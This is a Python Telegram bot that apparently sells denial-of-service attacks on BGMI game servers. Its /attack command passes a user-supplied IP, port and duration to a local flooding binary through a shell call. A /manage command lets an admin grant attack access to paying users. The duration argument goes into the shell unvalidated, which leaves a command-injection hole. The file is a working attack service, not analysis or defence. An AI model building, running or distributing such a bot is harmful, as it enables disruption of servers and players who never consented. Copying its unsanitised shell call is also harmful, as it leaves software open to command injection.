import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import re

TELEGRAM_BOT_TOKEN = ''
ADMIN_USER_ID = 6150862515
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 彡[ᴅᴀʀᴋ x ꜱᴇʀᴠᴇʀ]彡 𝗗𝗱𝗼𝘀*\n"
        "*🔥 𝗢𝘄𝗻𝗲𝗿 @OggY*\n"
        "*🔥 SERVER BGMI*\n"
        "*🔥 𝗨𝘀𝗲 /attack 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝗺𝗘 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./russian {ip} {port} {time} 500",  # Russian binary command
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed ✅*\n*🔥 Owner @RAJOWNER90*\n*🔥 SERVER BGMI*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐓𝐨 𝐆𝐞𝐭 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭 » @RAJOWNER90*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⭐ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 3 𝐓𝐨 5 𝐌𝐢𝐧𝐮𝐭𝐞 𝐅𝐨𝐫 𝐍𝐞𝐱𝐭 𝐀𝐭𝐭𝐚𝐜𝐤 /attack*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*🌟 Uses » /attack ip:port time*", parse_mode='Markdown')
        return

    # Extracting IP and Port from the first argument (e.g. 103.219.202.12:10016)
    ip_port = args[0]
    time = args[1]

    # Use regex to split the IP and Port
    match = re.match(r'(\d+\.\d+\.\d+\.\d+):(\d+)', ip_port)
    if not match:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP:Port format. Use IP:PORT (e.g., 103.219.202.12:10016)*", parse_mode='Markdown')
        return

    ip = match.group(1)
    port = match.group(2)

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @😆*\n"        
        f"*🔥 SERVER BGMI*"           
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def stop(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id != str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You do not have permission to stop the attack.*", parse_mode='Markdown')
        return

    if not attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack is currently in progress.*", parse_mode='Markdown')
        return

    # Logic to stop the attack (if possible for the binary)
    # You may want to kill the subprocess or add custom logic here if the Russian binary supports stopping
    attack_in_progress = False
    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack has been stopped.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.run_polling()

if __name__ == '__main__':
    main()